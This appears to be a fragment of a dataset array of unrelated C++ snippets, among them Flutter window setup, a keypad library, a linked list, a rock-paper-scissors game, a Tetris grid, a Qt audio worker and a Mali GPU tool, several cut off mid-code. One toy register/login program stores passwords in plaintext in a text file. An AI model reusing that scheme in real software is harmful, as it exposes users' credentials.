window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    Se",
    "#include <rusty_keypad.h>\n\nvoid RustyKeypad::scan()\n{\n\n    if (!isEnabled())\n    {\n        return;\n    }\n\n    if (KeyList == nullptr)\n    {\n        setFactoryConfig();\n    }\n\n    interrupted = false;\n    checkBuzzer();\n    RustyKeyNode *temp = KeyList->getHead();\n    bool change = false;\n    String pressed_keys = \"\";\n    while (temp != nullptr)\n    {\n        if (checkWaitKey(temp->data))\n        {\n            temp = temp->next;\n            continue;\n        }\n\n        if (checkKey(temp->data))\n        {\n            change = !interrupted;\n        }\n        if (interrupted)\n            break;\n        if (temp->data->isPressed())\n        {\n            pressed_keys += String(temp->data->getKeyCode());\n            if (getType() == RKP_T9)\n            {\n                setWaitKey(temp->data);\n                break;\n            }\n        }\n\n        temp = temp->next;\n    }\n    if (!change)\n        return;\n    if (pressed_keys.length() > 1 && multipleKeyListener != NULL)\n        multipleKeyListener(pressed_keys);\n}\n\nbool RustyKeypad::checkKey(RustyKey *key)\n{\n    if (!key->check())\n    {\n        return false;\n    }\n    switch (key->getCurrentEvent())\n    {\n    case KeypadEventTypes::RKP_KEY_DOWN:\n        if (keyDownListener != NULL)\n        {\n            keyDownListener(key->getKeyCode());\n        }\n        beepBuzzer(1);\n        break;\n    case KeypadEventTypes::RKP_T9_NEXT_CHAR:\n        textChangeListener(getKeypadData() + String(key->getKeyCode()));\n        break;\n    case KeypadEventTypes::RKP_KEY_UP:\n        appendKey(key->getKeyCode());\n        if (keyUpListener != NULL)\n        {\n            keyUpListener(key->getKeyCode());\n        }\n        resetWaitKey();\n        break;\n    case KeypadEventTypes::RKP_LONG_PRESS:\n        if (longPressListener != NULL)\n        {\n            longPressListener(key->getKeyCode());\n        }\n        resetWaitKey();\n        break;\n\n    case KeypadEventTypes::RKP_PRESS_DELETE:\n        setWaitKey(key);\n        deleteChar();\n        if (onDeleteListener != NULL)\n        {\n            onDeleteListener(getDeleteKey());\n        }\n        beepBuzzer(2);\n        break;\n    case KeypadEventTypes::RKP_RELEASE_DELETE:\n        resetWaitKey();\n        break;\n    case KeypadEventTypes::RKP_CLEAR_SCREEN:\n        clearScreen();\n        beepBuzzer(5);\n        break;\n    case KeypadEventTypes::RKP_PRESS_ENTER:\n        setWaitKey(key);\n        if (onEnterListener != NULL)\n        {\n            onEnterListener(getKeypadData());\n        }\n        beepBuzzer(10);\n        break;\n    case KeypadEventTypes::RKP_RELEASE_ENTER:\n        resetWaitKey();\n        clearScreen();\n        break;\n    default:\n        break;\n    }\n    return true;\n}",
    "#include <iostream>\r\n#include <string>\r\n#include <memory>\r\n#include <algorithm>\r\n\r\ntemplate <typename T>\r\nclass Node {\r\npublic:\r\n\tT data;\r\n\tstd::unique_ptr<Node<T>> next;\r\n\r\n\tNode(const T& value) : data(value), next(nullptr) {}\r\n};\r\n\r\ntemplate <typename T>\r\nclass LinkedList {\r\nprivate:\r\n\tstd::unique_ptr<Node<T>> head;\r\n\r\npublic:\r\n\tLinkedList() : head(nullptr) {}\r\n\r\n\tvoid push_front(const T& value) {\r\n\t\tauto newNode = std::make_unique<Node<T>>(value);\r\n\t\tnewNode->next = std::move(head);\r\n\t\thead = std::move(newNode);\r\n\t}\r\n\r\n\tvoid push_back(const T& value) {\r\n\t\tauto newNode = std::make_unique<Node<T>>(value);\r\n\t\tif (is_empty()) {\r\n\t\t\thead = std::move(newNode);\r\n\t\t}\r\n\t\telse {\r\n\t\t\tNode<T>* current = head.get();\r\n\t\t\twhile (current->next) {\r\n\t\t\t\tcurrent = current->next.get();\r\n\t\t\t}\r\n\t\t\tcurrent->next = std::move(newNode);\r\n\t\t}\r\n\t}\r\n\r\n\tvoid pop_front() {\r\n\t\tif (!is_empty()) {\r\n\t\t\thead = std::move(head->next);\r\n\t\t}\r\n\t}\r\n\r\n    \r\n    void pop_back() {\r\n        if (is_empty()) return;\r\n\r\n        if (!head->next) {\r\n            head.reset(); \r\n            return;\r\n        }\r\n\r\n        Node<T>* current = head.get();\r\n        while (current->next && current->next->next) {\r\n            current = current->next.get();\r\n        }\r\n        current->next.reset(); \r\n    }\r\n\r\n    \r\n    Node<T>* find(const T& value) {\r\n        Node<T>* current = head.get();\r\n        while (current) {\r\n            if (current->data == value) {\r\n                return current;\r\n            }\r\n            current = current->next.get();\r\n        }\r\n        return nullptr; \r\n    }\r\n\r\n   \r\n    void remove(const T& value) {\r\n        if (is_empty()) return;\r\n\r\n        if (head->data == value) {\r\n            pop_front();\r\n            return;\r\n        }\r\n\r\n        Node<T>* current = head.get();\r\n        while (current->next) {\r\n            if (current->next->data == value) {\r\n                current->next = std::move(current->next->next);\r\n                return;\r\n            }\r\n            current = current->next.get();\r\n        }\r\n    }\r\n\r\n    \r\n    void print() const {\r\n        Node<T>* current = head.get();\r\n        while (current) {\r\n            std::cout << current->data << \" \";\r\n            current = current->next.get();\r\n        }\r\n        std::cout << std::endl;\r\n    }\r\n\r\n    \r\n    bool is_empty() const {\r\n        return head == nullptr;\r\n    }\r\n};\r\n\r\nint main() {\r\n    LinkedList<int> list;\r\n\r\n    list.push_back(1);\r\n    list.push_back(2);\r\n    list.push_front(0);\r\n    list.print();\r\n\r\n    list.pop_front();\r\n    list.print(); \r\n\r\n    list.pop_back();\r\n    list.print();\r\n\r\n    list.push_back(3);\r\n    list.push_back(2);\r\n    list.print();\r\n\r\n    list.remove(3);\r\n    list.print(); \r\n\r\n    if (list.find(1)) {\r\n        std::cout << \"1 is found in the list.\" << std::endl;\r\n    }\r\n    else {\r\n        std::cout << \"1 is not found in the list.\" << std::endl;\r\n    }\r\n\r\n    return 0;\r\n};",
    "/**************************************/\n/*  Project : PIERRE-FEUILLE-CISEAUX  */\n/*  Author : Elliissa01               */\n/*  Date : 2024                       */\n/**************************************/\n\n#include <iostream>\n#include <string>\n#include <limits>\n#include<cstdlib>\n#include<ctime>\n\n//Global variable.\nenum Option { PIERRE, FEUILLE, CISEAUX };\n\n//Functions.\nint askNumberGames();\nvoid displayGame(int game, int total);\nvoid displayInstruction();\nint askVerifyChoice();\nint randomChoice();\nstd::string displayOption(int choice);\nvoid revealGame(int playerChoice, int computerChoice);\nOption translateNumber(int choice);\nvoid checkWinner(int playerChoice, int computerChoice, int& scorePlayer, int& scoreComputer);\nvoid displayScore(int scorePlayer, int scoreComputer);\nvoid displayResult(int scorePlayer, int scoreComputer);\n\n//Main function.\nint main() {\n\tint playerChoice, computerChoice;\n\tint scorePlayer = 0, scoreComputer = 0;\n\tint game = askNumberGames();\n\t\n\t//Play as many times as wanted.\n\tfor (int i = 0; i < game; i++) {\n\t\tdisplayGame(i, game);\n\t\tdisplayInstruction();\n\t\tplayerChoice = askVerifyChoice();\n\t\tcomputerChoice = randomChoice();\n\t\trevealGame(playerChoice, computerChoice);\n\t\tcheckWinner(playerChoice, computerChoice, scorePlayer, scoreComputer);\n\t\tdisplayScore(scorePlayer, scoreComputer);\n\t}\n\n\t//See the result.\n\tdisplayResult(scorePlayer, scoreComputer);\n\n\treturn 0;\n}\n\n//Ask for the number of games.\nint askNumberGames() {\n\tint number;\n\n\tstd::cout << \" Combien de parties voulez-vous faire ? : \";\n\tstd::cin >> number;\n\n\twhile (!std::cin.good()) {\n\t\t//Ignore the remaining input.\n\t\tstd::cin.clear();\n\t\tstd::cin.ignore(std::numeric_limits<std::streamsize>::max(), '\\n');\n\t\t//Ask again.\n\t\tstd::cout << \" Nombre invalide.\" << std::endl << std::endl;\n\t\tstd::cout << \" Combien de parties voulez-vous faire ? : \";\n\t\tstd::cin >> number;\n\t}\n\n\tstd::cout << std::endl;\n\treturn number;\n}\n\n//Display game.\nvoid displayGame(int game, int total) {\n\tstd::cout << \" - Partie \" << ++game << \" / \" << total << \" -\" << std::endl;\n}\n\n//Display instruction to player.\nvoid displayInstruction() {\n\tstd::cout << \"======================\" << std::endl;\n\tstd::cout << \" Tapez 0 pour PIERRE \" << std::endl << \" Tapez 1 pour FEUILLE \" << std::endl << \" Tapez 2 pour CISEAUX \" << std::endl;\n\tstd::cout << \"======================\" << std::endl;\n}\n\n//Ask choice to player and verify it.\nint askVerifyChoice() {\n\tint choice;\n\t\n\tstd::cout << std::endl << \" CHOIX : \";\n\tstd::cin >> choice;\n\tstd::cout << std::endl;\n\t\n\twhile (!std::cin.good() || (choice != 0 && choice != 1 && choice != 2)) {\n\t\t//Ignore the remaining input.\n\t\tstd::cin.clear();\n\t\tstd::cin.ignore(std::numeric_limits<std::streamsize>::max(), '\\n');\n\t\t//Ask again.\n\t\tstd::cout << \" Choix invalide.\" << std::endl;\n\t\tdisplayInstruction();\n\t\tstd::cout << std::endl << \" CHOIX : \";\n\t\tstd::cin >> choice;\n\t\tstd::cout << std::endl;\n\t}\n\n\treturn choice;\n}\n\n//Random choice made by the computer.\nint randomChoice() {\n\tstd::srand(std::time(NULL));\n\tint choice = std::rand() % 3;\n\n\treturn choice;\n}\n\n//Display the option as text.\nstd::string displayOption(int choice) {\n\tstd::string option = \"\";\n\t\n\tswitch (choice) {\n\t\tcase 0:\n\t\t\toption = \"PIERRE\";\n\t\t\tbreak;\n\t\tcase 1:\n\t\t\toption = \"FEUILLE\";\n\t\t\tbreak;\n\t\tcase 2:\n\t\t\toption = \"CISEAUX\";\n\t\t\tbreak;\n\t}\n\n\treturn option;\n}\n\n//Reveal the choices made.\nvoid revealGame(int playerChoice, int computerChoice) {\n\tstd::cout << \" VOUS --> |\" << displayOption(playerChoice) << \"|   VS   |\" << displayOption(computerChoice) << \"| <-- ORDI\" <<  std::endl ;\n}\n\n//Translate number in option.\nOption translateNumber(int choice) {\n\tOption option;\n\n\tswitch (choice) {\n\tcase 0:\n\t\treturn option = PIERRE;\n\tcase 1:\n\t\treturn option = FEUILLE;\n\tcase 2:\n\t\treturn option = CISEAUX;\n\t}\n}\n\n//Check the victory and defeat conditions.\n//Change the score.\nvoid checkWinner(int playerChoice, int computerChoice, int &scorePlayer, int &scoreComputer) {\n\tOption player = translateNumber(playerChoice);\n\tOption computer = translateNumber(computerChoice);\n\n\tif (player == computer) {\n\t\tstd::cout << \" Match nul.\" << std::endl;\n\t}\n\telse if ((player == PIERRE && computer == CISEAUX) || (player == FEUILLE && computer == PIERRE) || (player == CISEAUX && computer == FEUILLE)) {\n\t\tstd::cout << \" Victoire !\" << std::endl;\n\t\tscorePlayer++;\n\t}\n\telse {\n\t\tstd::cout << \" Perdu ...\" << std::endl;\n\t\tscoreComputer++;\n\t}\n}\n\n//Display the scores.\nvoid displayScore(int scorePlayer, int scoreComputer) {\n\tstd::cout << std::endl;\n\tstd::cout << \" Score personnel : \" << scorePlayer << std::endl;\n\tstd::cout << \" Score ordinateur : \" << scoreComputer << std::endl;\n\tstd::cout << std::endl;\n\tstd::cout << \"----------------------------------------------\";\n\tstd::cout << std::endl << std::endl;\n}\n\n//Display the final result.\nvoid displayResult(int scorePlayer, int scoreComputer) {\n\tif (scorePlayer > scoreComputer) {\n\t\tstd::cout << \" JOUEUR GAGNANT !!! \" << std::endl;\n\t}\n\telse if (scorePlayer == scoreComputer) {\n\t\tstd::cout << \" MATCH NUL. \" << st",
    "#include <iostream>\r\n#include <fstream>\r\n#include <string>\r\n\r\nusing namespace std;\r\n\r\nvoid registerUser() {\r\n    string username, password;\r\n\r\n    cout << \"Enter username: \";\r\n    cin >> username;\r\n    cout << \"Enter password: \";\r\n    cin >> password;\r\n\r\n    // Open file in append mode\r\n    ofstream outFile(\"users.txt\", ios::app);\r\n    outFile << username << \" \" << password << endl;\r\n    outFile.close();\r\n\r\n    cout << \"Registration successful!\" << endl;\r\n}\r\n\r\nbool loginUser() {\r\n    string username, password, user, pass;\r\n\r\n    cout << \"Enter username: \";\r\n    cin >> username;\r\n    cout << \"Enter password: \";\r\n    cin >> password;\r\n\r\n    // Open file in read mode\r\n    ifstream inFile(\"users.txt\");\r\n    bool found = false;\r\n\r\n    while (inFile >> user >> pass) {\r\n        if (user == username && pass == password) {\r\n            found = true;\r\n            break;\r\n        }\r\n    }\r\n\r\n    inFile.close();\r\n\r\n    if (found) {\r\n        cout << \"Login successful!\" << endl;\r\n        return true;\r\n    } else {\r\n        cout << \"Invalid username or password.\" << endl;\r\n        return false;\r\n    }\r\n}\r\n\r\nint main() {\r\n    int choice;\r\n\r\n    while (true) {\r\n        cout << \"\\n1. Register\\n2. Login\\n3. Exit\\n\";\r\n        cout << \"Enter your choice: \";\r\n        cin >> choice;\r\n\r\n        switch (choice) {\r\n            case 1:\r\n                registerUser();\r\n                break;\r\n            case 2:\r\n                loginUser();\r\n                break;\r\n            case 3:\r\n                cout << \"Exiting...\" << endl;\r\n                return 0;\r\n            default:\r\n                cout << \"Invalid choice. Please try again.\" << endl;\r\n        }\r\n    }\r\n\r\n    return 0;\r\n}",
    "#include <iostream>\n#include <SFML/Graphics.hpp>\n#include <SFML/Window.hpp>\n#include <SFML/System.hpp>\n#include <SFML/Audio.hpp>\n#include <SFML/Network.hpp>\n#include <cstdlib>\n#include <random>\n#include <chrono>\n#include <thread>\n\nusing namespace std;\nusing namespace sf;\n\n\nconst float gridWIDTH = 300;\nconst float gridHEIGHT = gridWIDTH * 2;\nconst float WIDTH = gridWIDTH + 300;\nconst float HEIGHT = gridHEIGHT + 200;\n\n\nenum Colour\n{\n    Yellow, Orange, Green, Red, Blue, Purple, LightBlue, None\n};\nstruct gridIndex\n{\n    int y;\n    int x;\n};\n\nclass Grid\n{\n    //20x10\nprivate:\n    Colour grid[20][10];\n\n    //graphics\n    RectangleShape background;\n    RectangleShape rects[20][10];\n    Texture textures[6];\npublic:\n    Grid()\n    {\n        for (int i = 0; i < 20; i++)\n        {\n            for (int x = 0; x < 10; x++)\n            {\n                grid[i][x] = None;\n            }\n        }\n\n        textures[0].loadFromFile(\"None.jpg\");\n        textures[1].loadFromFile(\"Blue.jpg\");\n        textures[2].loadFromFile(\"Green.jpg\");\n        textures[3].loadFromFile(\"Purple.jpg\");\n        textures[4].loadFromFile(\"Red.jpg\");\n        textures[5].loadFromFile(\"Yellow.jpg\");\n\n\n        background.setSize(Vector2f(gridWIDTH, gridHEIGHT));\n        background.setPosition(Vector2f(150.f, 100.f));\n        background.setFillColor(Color(0, 0, 102));\n        background.setOutlineThickness(10);\n        background.setOutlineColor(Color(102, 102, 255));\n\n\n        for (auto i = 0; i < 20; i++)\n        {\n            for (auto x = 0; x < 10; x++)\n            {\n                rects[i][x].setPosition(Vector2f(static_cast<float>(x * gridWIDTH / 10 + background.getPosition().x), static_cast<float>(i * gridHEIGHT / 20 + background.getPosition().y)));\n                rects[i][x].setSize(Vector2f(static_cast<float>(gridWIDTH / 10), static_cast<float>(gridHEIGHT / 20)));\n                rects[i][x].setTexture(&textures[0]);\n            }\n        }\n\n    }\n    void    printGrid()\n    {\n        for (int i = 0; i < 20; i++)\n        {\n            for (int x = 0; x < 10; x++)\n            {\n                if (grid[i][x] != None)\n                {\n                    cout << \"[] \";\n                }\n                else\n                {\n                    cout << \".  \";\n                }\n            }\n\n            cout << endl;\n        }\n    }\n    void    setSegmentColour(int y, int x, Colour colour)\n    {\n        grid[y][x] = colour;\n    }\n    int     clearFilledLines()\n    {\n        int linesCleared = 0;\n        bool first = true;\n        int time = 0;\n        for (int i = 0; i < 20; i++)\n        {\n            bool lineFilled = true;\n\n            for (int x = 0; x < 10; x++)\n            {\n                if (grid[i][x] == None) lineFilled = false;\n            }\n\n            if (lineFilled)\n            {\n                if (first)\n                {\n                    std::this_thread::sleep_for(std::chrono::nanoseconds(10));\n                    std::this_thread::sleep_until(std::chrono::system_clock::now() + std::chrono::nanoseconds(10000));\n                    first = false;\n                }\n                linesCleared++;\n                for (int z = i; z >= 1; z--)\n                {\n                    for (int x = 0; x < 10; x++)\n                    {\n                        grid[z][x] = grid[z - 1][x];\n                    }\n                }\n\n            }\n\n        }\n\n        return linesCleared;\n    }\n    Colour  getSegment(int y, int x)\n    {\n        return grid[y][x];\n    }\n    void    updateGraphics()\n    {\n        for (int i = 0; i < 20; i++)\n        {\n            for (int x = 0; x < 10; x++)\n            {\n                switch (grid[i][x])\n                {\n                case Yellow:\n                    //rects[i][x].setFillColor(Color::Yellow);\n                    rects[i][x].setTexture(&textures[5]);\n                    break;\n                case None:\n                    rects[i][x].setTexture(&textures[0]);\n                    break;\n                case Orange:\n                    rects[i][x].setTexture(&textures[5]);\n                    break;\n                case Green:\n                    rects[i][x].setTexture(&textures[2]);\n                    break;\n                case Red:\n                    rects[i][x].setTexture(&textures[4]);\n                    break;\n                case Blue:\n                    rects[i][x].setTexture(&textures[1]);\n                    break;\n                case Purple:\n                    rects[i][x].setTexture(&textures[3]);\n                    break;\n                case LightBlue:\n                    rects[i][x].setTexture(&textures[1]);\n                    break;\n                }\n            }\n        }\n    }\n    void    clear()\n    {\n        for (int i = 0; i < 20; i++)\n        {\n            for (int x = 0; x < 10; x++)\n            {\n                grid[i][x] = None;\n            }\n        }\n    }\n    void    draw(RenderWindow* window)\n    {\n        window->draw(background);\n        for (",
    "#include \"worker.h\"\n\nWorker::Worker(QTimer*timer):\n\n    isPaused(false)\n  ,sliderMove(false)\n  ,timer(timer)\n{\n\n    connect(timer, &QTimer::timeout, this,&Worker::onTimeOut);\n\n}\n\n\nWorker::~Worker()\n{\n    qDebug()<<\"desruct Worker\";\n}\n\nvoid Worker::stop()\n{\n    timer->stop();\n    timer->deleteLater();\n}\n\nvoid Worker::receive_totalDuration(qint64 total)\n{\n    this->totalAudioDurationInMS=total;\n}\nvoid Worker::receive_lrc(std::map<int, std::string> lyrics)\n{\n    std::lock_guard<std::mutex>lock(mtx);\n    this->lyrics=lyrics;\n}\n//void  Worker::begin_play(QString pcmFilePath){\n//    //qDebug()<<\"Worker\"<<QThread::currentThreadId();\n//    emit play(pcmFilePath);\n\n//}\nvoid Worker::stop_play()\n{\n    emit stopPlay();\n}\nvoid Worker::Set_Volume(int value)\n{\n    if(audioOutput)\n        audioOutput->setVolume(value/100.0);\n}\nvoid Worker::set_SliderMove(bool flag)\n{\n    this->sliderMove=flag;\n\n    emit stopPlay();\n}\nvoid Worker::Pause()\n{\n\n    if (!isPaused||this->sliderMove)\n    {\n        qDebug() << \"\u6682\u505c\";\n        audioOutput->suspend();\n        timer->stop();\n\n        isPaused = true;\n        qDebug() << \"Playback paused CC:\";\n        emit Stop();\n    }\n    else if (isPaused)\n    {\n        qDebug() << \"\u6062\u590d\";\n        audioOutput->resume();\n        isPaused = false;\n        timer->start();\n\n        emit Begin();\n        qDebug() << \"Playback resumed.\";\n    }\n}\n//void Worker::play_pcm(QString pcmFilePath ){\n\n//    qDebug()<<\"Worker\"<<QThread::currentThreadId();\n//    if (file) {\n//        file->close();\n//        file.reset();\n//    }\n//    if(audioOutput){\n//        isPaused=false;\n//        audioOutput->stop();\n//        audioOutput->reset();\n//        delete audioOutput;\n//        qDebug()<<\"\u91cd\u64ad\";\n//        if(buffer){\n//            delete [] buffer;\n//        }\n//        disconnect(this,&Worker::stopPlay,this,nullptr);\n//    }\n//    file = std::make_unique<QFile>(pcmFilePath);\n//    if (!file->open(QIODevice::ReadOnly)) {\n//        qDebug() << \"Failed to open file for reading:\" << file->errorString();\n//        return;\n//    }\n\n//    QAudioFormat format;\n//    format.setSampleRate(44100);\n//    format.setChannelCount(2);\n//    format.setSampleSize(16);\n//    format.setCodec(\"audio/pcm\");\n//    format.setByteOrder(QAudioFormat::LittleEndian);\n//    format.setSampleType(QAudioFormat::SignedInt);\n\n//    audioOutput =new QAudioOutput(format, this);\n//    audioOutput->setBufferSize(8192 * 8);\n\n//    audioDevice = audioOutput->start();\n//    if (!audioDevice) {\n//        qDebug() << \"Failed to start audio device\";\n//        file->close();\n//        file.reset();\n//        return;\n//    }\n\n//    audioOutput->setVolume(50/100.0);\n\n\n//    buffer = new char[bufferSize];\n\n//    timer = new QTimer(this);\n//    timer1= new QTimer(this);\n//    int currentLyricIndex = 0;  // \u7528\u4e8e\u8ffd\u8e2a\u5f53\u524d\u6b4c\u8bcd\u7684\u4f4d\u7f6e\n//    connect(timer, &QTimer::timeout, this, [=]() mutable {\n//        if (audioOutput->bytesFree() < bufferSize) {\n//            // \u7f13\u51b2\u533a\u5c1a\u672a\u817e\u51fa\u8db3\u591f\u7684\u7a7a\u95f4\uff0c\u7a0d\u540e\u518d\u8bd5\n//            return;\n//        }\n\n//        qint64 bytesRead = file->read(buffer, bufferSize);\n\n//        if (bytesRead > 0) {\n//            qint64 bytesWritten = audioDevice->write(buffer, bytesRead);\n//            if (bytesWritten < 0) {\n//                qDebug() << \"Error writing audio data:\" << audioDevice->errorString();\n//                timer->stop();\n//                timer1->stop();\n//                delete[] buffer;\n//                file->close();\n//                file.reset();\n//                return;\n//            }\n\n//            // \u83b7\u53d6\u5f53\u524d\u97f3\u9891\u64ad\u653e\u7684\u5fae\u79d2\u6570\uff0c\u5e76\u5c06\u5176\u8f6c\u6362\u4e3a\u6beb\u79d2\n//            qint64 currentTimeMS = audioOutput->processedUSecs() / 1000;\n\n//            // \u904d\u5386\u6b4c\u8bcd\u5e76\u540c\u6b65\u663e\u793a\n//            if (!lyrics.empty() && currentLyricIndex < (int)lyrics.size()) {\n//                auto it = std::next(lyrics.begin(), currentLyricIndex);  // \u83b7\u53d6\u5f53\u524d\u6b4c\u8bcd\n//                if (currentTimeMS >= it->first) {\n//                    if(it->second!=\"\")\n//                        emit send_lrc(QString::fromStdString(it->second));\n//                    currentLyricIndex++;  // \u66f4\u65b0\u5230\u4e0b\u4e00\u6761\u6b4c\u8bcd\n//                }\n//            }\n//        } else {\n//            // \u6587\u4ef6\u8bfb\u53d6\u5b8c\u6bd5\uff0c\u505c\u6b62\u5b9a\u65f6\u5668\n//            timer->stop();\n//            timer1->stop();\n//            qDebug() << \"Playback finished AA\";\n//            delete[] buffer;\n//            file->close();\n//            file.reset();\n//            emit Stop();\n//            emit rePlay();\n//            disconnect(this,&Worker::stopPlay,this,nullptr);\n//        }\n//    });\n\n\n//    timer->start(10);  // \u6bcf10\u6beb\u79d2\u68c0\u67e5\u4e00\u6b21\n//    timer1->start(1000);\n//    emit Begin();\n\n//    connect(timer1,&QTimer::timeout,this,[=](){\n//        emit durations(audioOutput->processedUSecs());\n//    });\n\n\n//    connect(this, &Worker::stopPlay, this, [=]() mutable {\n\n//        //qDebug()<<pcmFilePath;\n//        if (!isPaused) {\n//            // \u6682\u505c\u64ad\u653e\n//            qDebug() << \"\u6682\u505c\";\n//            audioOutput->suspend();\n//            timer->stop();\n//            timer1->stop();\n//            isPaused = true;\n//            qDebug() << \"Playb",
    "/*\n * Copyright (c) 2024 Arm Limited.\n *\n * SPDX-License-Identifier: MIT\n *\n * Permission is hereby granted, free of charge, to any person obtaining a copy\n * of this software and associated documentation files (the \"Software\"), to\n * deal in the Software without restriction, including without limitation the\n * rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n * sell copies of the Software, and to permit persons to whom the Software is\n * furnished to do so, subject to the following conditions:\n *\n * The above copyright notice and this permission notice shall be included in all\n * copies or substantial portions of the Software.\n *\n * THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE\n * SOFTWARE.\n */\n\n#include <iostream>\n#include <cstring>\n#include <bitset>\n#include <sstream>\n\n#include \"utils.hpp\"\n#include \"process.hpp\"\n#include \"partition.hpp\"\n#include \"gpu.hpp\"\n\nusing namespace std;\n\n/*\n * Outputs a load bar in the terminal\n */\nstring load_bar(uint64_t val, uint64_t ref)\n{\n    int width = 30;\n    float pct = (float)val/(float)ref * 100.0f;\n    string out = \"[\";\n\n    for (int i=0; i<width; i++)\n    {\n        if(i<=pct*width/100)\n            out.append(\"#\");\n        else\n            out.append(\" \");\n    }\n    out.append(\"] \");\n    if(pct < 100/width)\n        out.append(\" <\"+to_string(100/width));\n    else\n        out.append(to_string(static_cast<int>(pct)));\n    out.append(\"%\");\n\n    return out;    \n}\n\n/*\n * Convert string representing hex value to list of bit id\n */\nstring hex_to_id(string val)\n{\n    string bin, ret=\"\";\n    uint64_t n, i=val.length();\n\n    istringstream(val) >> std::hex >> n;\n    bin = std::bitset<4>{n}.to_string();\n\n    // Reads indexes in reverse\n    for(char& c : bin) \n    {\n        if(c == '1')\n        {\n            ret += to_string(i);\n            ret += \" \";\n        }\n\n        i--;\n    }\n\n    return ret;\n}\n\n/*\n * Printable gpu class\n */\nclass printable_mali_gpu : public mali_gpu\n{\n    public:\n        bool display_yaml;\n        printable_mali_gpu( bool emit_yaml=false ) { display_yaml = emit_yaml; };\n        ~printable_mali_gpu() {};\n};\n\n/*\n * Print processes\n */\nostream& operator<<(ostream& os, mali_process& obj) \n{\n    os << \"      PID \" << obj.get_pid() << \":\" << endl;\n    os << \"        Command: \" << obj.get_cmd() << endl;\n    if(obj.get_memory_usage() >= 0)\n        os << \"        Memory usage (kB): \" << obj.get_memory_usage() << endl;\n\n    return os;\n}\n\n/*\n * Print partition\n */\nostream& operator<<(ostream& os, mali_partition& obj) \n{\n    vector<mali_process> procs = obj.get_processes();\n\n    os << \"  Partition \" << obj.get_partition_name() << \":\" << endl;\n    os << \"    Status: \" << obj.get_status() << endl;\n    if(obj.get_slices() != \"N/A\")\n        os << \"    Allocated slice ID(s): \" << hex_to_id(obj.get_slices()) << endl;\n    if(obj.get_assigned_aw() != \"N/A\")\n        os << \"    Assigned access window ID: \" << hex_to_id(obj.get_assigned_aw()) << endl;\n    os << \"    Memory usage (kB): \" << obj.get_memory_usage() << endl;\n    os << \"    Running processes: \";\n\n    if(procs.empty())\n        os << \"None\" << endl;\n    else{\n        os << endl;\n        for(mali_process& i : procs)\n            cout << i;\n    }\n\n    return os;\n}\n\n/*\n * Print gpu\n */\nostream& operator<<(ostream& os, printable_mali_gpu& obj) \n{\n    vector<mali_partition> part = obj.get_partitions();\n\n    if(part.empty())\n        os << \"Could not found any Mali GPU\" << endl;\n    else\n    {\n        if(obj.display_yaml)\n        {\n            os << \"---\" << endl;\n        }\n        os << \"GPU configuration: \" << endl;\n        os << \"  Name: \" << obj.get_name() << endl;\n        if(obj.get_ddk_version() != \"N/A\")\n            os << \"  DDK version: \" << obj.get_ddk_version() << endl;\n        os << \"  Available partitions: \" << obj.get_partitions().size() << endl;\n        os << \"  GPU memory usage (kB): \";\n        if(obj.display_yaml)\n            os << obj.get_memory_usage() << endl;\n        else\n            os << \"         \" << load_bar(obj.get_memory_usage(), obj.get_system_memory()) << \" system memory\" << endl;\n        if(!obj.display_yaml)\n        {\n            if(obj.get_partitions().size() > 1)\n            {\n                for(mali_partition& i : part)\n                {\n                    os << \"    Partition \" << i.get_partition_name() << \" memory usage: \";\n                    os << load_bar(i.get_memory_usage(), obj.get_memory_usage()) << \" GPU memory usage\" << endl;\n                }\n            }\n        }\n        \n        os << \"  Total system memory (kB): \" << obj.get_system_memory(",
